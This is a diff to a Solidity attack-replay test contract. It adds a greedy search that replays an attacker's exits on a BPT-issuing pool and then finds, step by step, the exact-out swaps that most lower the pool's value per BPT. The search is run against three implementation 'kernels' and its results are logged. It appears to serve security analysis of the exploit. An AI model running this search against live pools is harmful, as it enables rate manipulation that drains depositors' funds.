@@ -201,6 +201,83 @@ contract AttackReplay is Test {
         assertEq(feSupply, realSupply, "BPT supply after the attack");
     }
 
+    /// The attacker's exits in transaction 1 bring the pool to 67,000 wei of each token.
+    uint256 internal constant EXITS = 22;
+    /// The attacker's swap phase in transaction 1 has 90 steps.
+    uint256 internal constant ADAPTIVE_STEPS = 90;
+    uint256 internal constant CANDIDATES = 95;
+
+    /// An exact-out amount to try: 1 to 40 wei, the whole balance less 1 to 40
+    /// wei, or a sixteenth of it, two sixteenths, ... fifteen sixteenths.
+    function _candidate(uint256 held, uint256 c) internal pure returns (uint256) {
+        if (c < 40) return c + 1;
+        if (c < 80) return held > c - 39 ? held - (c - 39) : 0;
+        return held * (c - 79) / 16;
+    }
+
+    /// The value per BPT, or 0 if the pool's invariant cannot be computed.
+    function _rate(IFePool pool) internal view returns (uint256) {
+        (bool ok, bytes memory ret) = address(pool).staticcall(abi.encodeCall(IFePool.getRate, ()));
+        return ok ? abi.decode(ret, (uint256)) : 0;
+    }
+
+    /// One step: every candidate exact-out swap in both directions, each on a
+    /// snapshot; returns the one that leaves the lowest value per BPT, even if
+    /// that is higher than now, so the attacker can take setup moves.
+    function _bestSwap(IFePool pool) internal returns (uint256 bestIn, uint256 bestAmount, uint256 bestRate) {
+        (uint256[2] memory balances,,,) = pool.getState();
+        bestRate = type(uint256).max;
+        for (uint256 i = 0; i < 2; i++) {
+            uint256 held = balances[1 - i];
+            for (uint256 c = 0; c < CANDIDATES; c++) {
+                uint256 a = _candidate(held, c);
+                if (a == 0 || a >= held) continue;
+                uint256 snap = vm.snapshotState();
+                try pool.swapGivenOut(i, a) {
+                    uint256 r = _rate(pool);
+                    if (r != 0 && r < bestRate) (bestIn, bestAmount, bestRate) = (i, a, r);
+                } catch {}
+                vm.revertToState(snap);
+            }
+        }
+    }
+
+    /// The attacker's own exits, then a swap phase re-planned against the
+    /// kernel in front of it: at every step the swap that leaves the value per
+    /// BPT lowest, for as many steps as the attacker took. Records the lowest
+    /// value per BPT reached.
+    function _adapt(uint256 k, IFePool pool, Step[] memory steps) internal {
+        for (uint256 i = 0; i < EXITS; i++) {
+            (bool ok,,) = _run(pool, steps[i]);
+            require(ok, "the attacker's exits must run");
+        }
+        uint256 start = _rate(pool);
+        uint256 lowest = start;
+        uint256 done;
+        for (; done < ADAPTIVE_STEPS; done++) {
+            (uint256 bestIn, uint256 bestAmount, uint256 bestRate) = _bestSwap(pool);
+            if (bestAmount == 0) break;
+            pool.swapGivenOut(bestIn, bestAmount);
+            if (bestRate < lowest) lowest = bestRate;
+        }
+        vm.writeLine(OUT, string.concat(
+            "adaptive,", KERNELS[k], ",", vm.toString(done), ",", vm.toString(start), ",", vm.toString(lowest), ",",
+            vm.toString(_rate(pool))
+        ));
+    }
+
+    function test_adaptiveSwapPhase() public {
+        // About 50,000 trial swaps: a search, not a transaction, so its gas is not metered.
+        vm.pauseGasMetering();
+        IFePool[3] memory pools = _load(1);
+        Step[] memory steps = _steps(1);
+        for (uint256 k = 0; k < 3; k++) {
+            uint256 snap = vm.snapshotState();
+            _adapt(k, pools[k], steps);
+            vm.revertToState(snap);
+        }
+    }
+
     function test_attack1() public {
         _replayAttack(1);
     }
